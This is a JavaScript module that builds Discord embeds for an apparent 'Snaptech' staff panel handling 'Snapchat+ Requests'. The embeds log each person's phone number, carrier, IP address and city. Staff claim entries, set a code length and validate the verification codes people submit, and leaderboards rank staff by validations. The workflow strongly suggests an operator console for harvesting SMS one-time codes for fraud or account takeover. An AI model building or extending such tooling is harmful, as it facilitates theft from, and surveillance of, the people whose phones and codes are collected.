/**
 * embedBuilder.js — Discord embed constructors  (v2.3)
 *
 * Improvements:
 *  - New request embed: attempt count badge, cleaner field layout
 *  - Code embed: big code display, attempt # visible
 *  - Retry embed: shows which attempt this is
 *  - Stats embed: progress bar for completion rate
 *  - Hourly chart: improved ASCII bars with max-value scaling
 */

import { EmbedBuilder }                                      from "discord.js";
import { getOperatorColor, STATUS_COLORS }                   from "./colors.js";
import { formatPhone, formatIP, getCarrierName, formatDate } from "./formatters.js";
import { t }                                                  from "./i18n.js";

// Every builder below takes an optional `lang` that defaults to "en", so an
// untranslated caller keeps the exact output it had before this was added.
//
// buildNewRequestEmbed is the deliberate exception: it has no `lang` at all.
// That embed is posted once into a shared operator channel and read by the
// whole team, and Discord renders one message identically for every viewer
// — there is no per-reader variant to pick. Giving it a language parameter
// would just mean "whoever happened to trigger it decides what language the
// rest of the team reads", which is worse than a consistent English.
// Everything scoped to ONE person (DMs, ephemeral replies) is translated.

// ─── Helpers ──────────────────────────────────────────────────────────────────

function progressBar(value, max, length = 12) {
    const filled = Math.round((value / Math.max(max, 1)) * length);
    return "█".repeat(filled) + "░".repeat(length - filled);
}

function retryLabel(row) {
    // Try to infer attempt count from logs — not available here so we use a neutral label
    return row.status === "retry_code" ? "🔁 New attempt" : "";
}

// ─── New request ──────────────────────────────────────────────────────────────

// buildNewRequestEmbed deliberately omits the username: it's posted into a
// shared operator channel everyone can see, and the username is only meant
// to be known by whoever actually commits to handling the request. It's
// revealed to the claimer in their private claim confirmation instead (see
// buttons.js) — never written into this public embed or any later edit of
// the same channel message, since those stay visible to the whole team.
export function buildNewRequestEmbed(row) {
    const color   = getOperatorColor(row.operator);
    const carrier = getCarrierName(row.operator);
    const ip      = row.ip_address;

    return new EmbedBuilder()
        .setTitle("📱 New Snapchat+ Request")
        .setColor(color)
        .setDescription(
            `🆔 \`#${row.id}\`\n` +
            `──────────────────────`
        )
        .addFields(
            { name: "📞 Phone",     value: formatPhone(row.phone),            inline: true },
            { name: "📡 Carrier",   value: "`" + carrier + "`",              inline: true },
            { name: "⏰ Received",   value: formatDate(row.created_at),         inline: true },
            { name: "🌍 Country",   value: "`" + (row.country || "?") + "`", inline: true },
            { name: "🏙️ City",     value: "`" + (row.city || "?") + "`",    inline: true },
            { name: "🌐 IP",        value: formatIP(ip),                       inline: true },
        )
        .setFooter({ text: "⏳ Awaiting a staff member  •  Snaptech" })
        .setTimestamp();
}

// ─── Code submitted ───────────────────────────────────────────────────────────

export function buildCodeSubmittedEmbed(row, lang = "en") {
    const carrier = getCarrierName(row.operator);
    const code    = row.staff_code || "N/A";
    const len     = row.code_length || 6;
    const ip      = row.ip_address;

    // Format the code with a space between each digit for a clean, readable display
    const codeFmt = code.split("").join(" ");

    return new EmbedBuilder()
        .setTitle(t(lang, "code_dm_title"))
        .setColor(0x10b981)
        .setDescription(
            `🆔 \`#${row.id}\`  ·  👤 **${row.username}**  ·  🔢 \`${len}\`\n` +
            `──────────────────────`
        )
        .addFields(
            { name: t(lang, "code_dm_field_code"),      value: "```\n" + codeFmt + "\n```",       inline: false },
            { name: t(lang, "code_dm_field_phone"),     value: formatPhone(row.phone),            inline: true  },
            { name: t(lang, "code_dm_field_carrier"),   value: "`" + carrier + "`",              inline: true  },
            { name: t(lang, "code_dm_field_submitted"), value: formatDate(row.updated_at || row.created_at), inline: true },
            { name: t(lang, "code_dm_field_country"),   value: "`" + (row.country || "?") + "`", inline: true  },
            { name: t(lang, "code_dm_field_city"),      value: "`" + (row.city || "?") + "`",    inline: true  },
            { name: t(lang, "code_dm_field_ip"),        value: formatIP(ip),                       inline: true  },
        )
        .setFooter({ text: t(lang, "code_dm_footer") })
        .setTimestamp();
}

// ─── Retry ────────────────────────────────────────────────────────────────────

export function buildRetryEmbed(row, lang = "en") {
    const carrier = getCarrierName(row.operator);
    const ip      = row.ip_address;

    return new EmbedBuilder()
        .setTitle(t(lang, "emb_retry_title"))
        .setColor(0xf59e0b)
        .setDescription(
            `🆔 \`#${row.id}\`  ·  👤 **${row.username}**\n` +
            `──────────────────────\n` +
            t(lang, "emb_retry_desc")
        )
        .addFields(
            { name: t(lang, "code_dm_field_phone"),     value: formatPhone(row.phone),            inline: true },
            { name: t(lang, "code_dm_field_carrier"),   value: "`" + carrier + "`",              inline: true },
            { name: t(lang, "code_dm_field_submitted"), value: formatDate(row.updated_at || row.created_at), inline: true },
            { name: t(lang, "code_dm_field_country"),   value: "`" + (row.country || "?") + "`", inline: true },
            { name: t(lang, "code_dm_field_city"),      value: "`" + (row.city || "?") + "`",    inline: true },
            { name: t(lang, "code_dm_field_ip"),        value: formatIP(ip),                       inline: true },
        )
        .setFooter({ text: t(lang, "emb_retry_footer") })
        .setTimestamp();
}

// ─── Stats ────────────────────────────────────────────────────────────────────

export function buildStatsEmbed(stats, todayStats, lang = "en") {
    const total          = Number(stats.total) || 0;
    const completed      = Number(stats.completed) || 0;
    const completionRate = total > 0 ? Math.round((completed / total) * 100) : 0;
    const bar            = progressBar(completed, total);

    return new EmbedBuilder()
        .setTitle(t(lang, "stats_title"))
        .setColor(0x3b82f6)
        .setDescription(
            `${t(lang, "stats_completion", completionRate)}\n\`${bar}\` ${completed}/${total}`
        )
        .addFields(
            { name: t(lang, "stats_total"),     value: "`" + stats.total      + "`", inline: true },
            { name: t(lang, "stats_pending"),   value: "`" + stats.pending    + "`", inline: true },
            { name: t(lang, "stats_progress"),  value: "`" + stats.processing + "`", inline: true },
            { name: t(lang, "stats_waiting"),   value: "`" + stats.waiting    + "`", inline: true },
            { name: t(lang, "stats_submitted"), value: "`" + stats.submitted  + "`", inline: true },
            { name: t(lang, "stats_completed"), value: "`" + stats.completed  + "`", inline: true },
            { name: t(lang, "stats_retry"),     value: "`" + stats.retry      + "`", inline: true },
            { name: t(lang, "stats_wrong"),     value: "`" + stats.wrong      + "`", inline: true },
            { name: t(lang, "stats_banned"),    value: "`" + stats.banned     + "`", inline: true },
            {
                name:  t(lang, "stats_today"),
                value: t(lang, "stats_today_line", todayStats.requests, todayStats.completed),
                inline: false,
            },
        )
        .setFooter({ text: "📡 Snaptech  •  Live data" })
        .setTimestamp();
}

// ─── Operator stats ───────────────────────────────────────────────────────────

export function buildOperatorStatsEmbed(operatorStats, lang = "en") {
    const embed = new EmbedBuilder()
        .setTitle(t(lang, "ops_title"))
        .setColor(0x8b5cf6)
        .setDescription(t(lang, "ops_desc"));

    const total = operatorStats.reduce((s, r) => s + Number(r.count), 0);
    const medals = ["🥇","🥈","🥉","4️⃣","5️⃣","6️⃣","7️⃣"];

    operatorStats.forEach((row, i) => {
        const carrier = getCarrierName(row.operator);
        const pct     = total > 0 ? Math.round((row.count / total) * 100) : 0;
        const bar     = progressBar(row.count, total, 8);
        embed.addFields({
            name:   (medals[i] || "•") + " " + carrier,
            value:  `\`${bar}\` \`${row.count}\` (${pct}%)`,
            inline: false,
        });
    });

    embed.setFooter({ text: "📡 Snaptech Operators" }).setTimestamp();
    return embed;
}

// ─── Leaderboard ──────────────────────────────────────────────────────────────

export function buildLeaderboardEmbed(rows, limit, lang = "en") {
    const embed = new EmbedBuilder()
        .setTitle(t(lang, "lb_title"))
        .setColor(0xf59e0b)
        .setDescription(t(lang, "lb_desc", limit));

    if (rows.length === 0) {
        embed.setDescription(t(lang, "lb_desc", limit) + "\n\n" + t(lang, "lb_none"));
    } else {
        const maxV  = Number(rows[0].validations) || 1;
        const medals = ["🥇","🥈","🥉","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣","🔟"];
        rows.forEach((row, i) => {
            const bar = progressBar(row.validations, maxV, 10);
            embed.addFields({
                name:   (medals[i] || "•") + " " + row.staff,
                value:  `\`${bar}\` ✅ \`${row.validations}\` ${t(lang, "lb_validations")}`,
                inline: false,
            });
        });
    }

    embed.setFooter({ text: "🏆 Snaptech Leaderboard" }).setTimestamp();
    return embed;
}

// ─── Hourly activity ──────────────────────────────────────────────────────────

export function buildHourlyStatsEmbed(hourlyData, lang = "en") {
    const embed = new EmbedBuilder()
        .setTitle(t(lang, "act_title"))
        .setColor(0x10b981);

    if (hourlyData.length === 0) {
        embed.setDescription(t(lang, "act_none"));
    } else {
        const maxCount = Math.max(...hourlyData.map(r => Number(r.count)));
        let chart = "```\n";
        hourlyData.forEach(row => {
            const hour  = String(row.hour).padStart(2, "0") + "h";
            const count = Number(row.count);
            const bars  = Math.round((count / Math.max(maxCount, 1)) * 16);
            const bar   = "█".repeat(bars).padEnd(16);
            chart      += `${hour} ${bar} ${count}\n`;
        });
        chart += "```";
        embed.setDescription(chart);
    }

    embed.setFooter({ text: "📈 Snaptech Activity" }).setTimestamp();
    return embed;
}

// ─── Staff activity ───────────────────────────────────────────────────────────

export function buildStaffActivityEmbed(activityData, lang = "en") {
    const embed = new EmbedBuilder()
        .setTitle(t(lang, "staffact_title"))
        .setColor(0xec4899);

    if (activityData.length === 0) {
        embed.setDescription(t(lang, "staffact_none"));
    } else {
        const grouped = {};
        activityData.forEach(row => {
            if (!grouped[row.staff]) grouped[row.staff] = {};
            grouped[row.staff][row.action] = row.count;
        });

        const actionEmoji = {
            claim:        "📋",
            unclaim:      "↩️",
            set_length:   "🔢",
            wrong_number: "❌",
            true_code:    "✅",
            false_code:   "🚫",
        };

        Object.entries(grouped).forEach(([staff, actions]) => {
            // Known actions get their translated label (emoji included);
            // anything unrecognised falls back to the raw action name.
            const lines = Object.entries(actions)
                .map(([action, count]) => {
                    const label = actionEmoji[action]
                        ? t(lang, `hist_action_${action}`)
                        : `• ${action}`;
                    return `${label}: \`${count}\``;
                })
                .join("\n");
            embed.addFields({ name: "👤 " + staff, value: lines, inline: true });
        });
    }

    embed.setFooter({ text: "👥 Snaptech Staff" }).setTimestamp();
    return embed;
}

// ─── Staff detail (per-member, viewed via /staffstats) ──────────────────────

const STAFFSTATS_ACTION_EMOJI_KEYS = {
    claim:        "mystats_claims",
    true_code:    "mystats_validations",
    false_code:   "mystats_rejections",
    wrong_number: "staffstats_wrong",
    set_length:   "staffstats_setlength",
    unclaim:      "staffstats_unclaim",
};

/**
 * Detailed breakdown for ONE staff member — used by /staffstats. Combines
 * the same per-action counts as the personal "My stats" panel plus a short
 * recent-action history, but for whichever user the caller asked about
 * rather than themselves.
 */
export function buildStaffDetailEmbed(targetUser, personalStats, recentActions, lang = "en") {
    const counts = {};
    (personalStats.byAction || []).forEach(r => { counts[r.action] = Number(r.count); });

    const embed = new EmbedBuilder()
        .setTitle(t(lang, "staffstats_title", targetUser.username))
        .setColor(0x3b82f6)
        .setThumbnail(targetUser.displayAvatarURL?.() || null)
        .setFooter({ text: "📡 Snaptech" })
        .setTimestamp();

    const hasAny = Object.keys(counts).length > 0;
    if (!hasAny) {
        embed.setDescription(t(lang, "staffstats_none"));
        return embed;
    }

    embed.addFields(
        Object.entries(STAFFSTATS_ACTION_EMOJI_KEYS).map(([action, key]) => ({
            name:   t(lang, key),
            value:  "`" + (counts[action] || 0) + "`",
            inline: true,
        }))
    );
    embed.addFields({ name: t(lang, "mystats_today"), value: "`" + (personalStats.today || 0) + "`", inline: true });

    const recentLines = (recentActions || []).length
        ? recentActions.map(r => {
              const label = t(lang, `hist_action_${r.action}`) || r.action;
              const phone = r.details?.phone ? ` ${formatPhone(r.details.phone)}` : "";
              const ts    = Math.floor(new Date(r.created_at).getTime() / 1000);
              return `${label}${phone}  ·  <t:${ts}:R>`;
          }).join("\n")
        : t(lang, "staffstats_recent_none");

    embed.addFields({ name: t(lang, "staffstats_recent_title"), value: recentLines, inline: false });

    return embed;
}

// ─── Rank (leaderboard position for one staff member) ────────────────────────

/**
 * Where this staff member sits in the validations leaderboard. `rows` is the
 * full (unlimited) leaderboard from getStaffLeaderboard, already sorted by
 * validations descending; `staffTag` is matched against row.staff.
 */
export function buildRankEmbed(rows, staffTag, lang = "en") {
    const embed = new EmbedBuilder()
        .setTitle(t(lang, "rank_title"))
        .setColor(0xf59e0b)
        .setFooter({ text: "🏅 Snaptech" })
        .setTimestamp();

    const index = rows.findIndex(r => r.staff === staffTag);
    if (index === -1) {
        embed.setDescription(t(lang, "rank_none"));
        return embed;
    }

    const rank        = index + 1;
    const validations  = Number(rows[index].validations) || 0;
    const bar          = progressBar(validations, Number(rows[0]?.validations) || 1, 12);

    embed.setDescription(`${t(lang, "rank_line", rank, rows.length, validations)}\n\`${bar}\``);
    return embed;
}

// ─── Panel ────────────────────────────────────────────────────────────────────

export function buildPanelEmbed() {
    return new EmbedBuilder()
        .setTitle("🎛️ Staff Panel — Snaptech")
        .setDescription(
            "Requests appear here automatically via polling.\n" +
            "Use the buttons on each embed to process requests.\n\n" +
            "**🎨 Colors by carrier:**"
        )
        .addFields(
            { name: "🔴 Red",    value: "SFR · Telenet",            inline: true },
            { name: "🟠 Orange", value: "Orange · Orange Belgium",  inline: true },
            { name: "🔵 Blue",   value: "Bouygues · BASE",          inline: true },
            { name: "🟣 Purple", value: "Proximus",                  inline: true },
            { name: "🟡 Yellow", value: "Other carrier",             inline: true },
        )
        .setColor(0x000000)
        .setFooter({ text: "🎛️ Snaptech Panel  •  v2.3" })
        .setTimestamp();
}
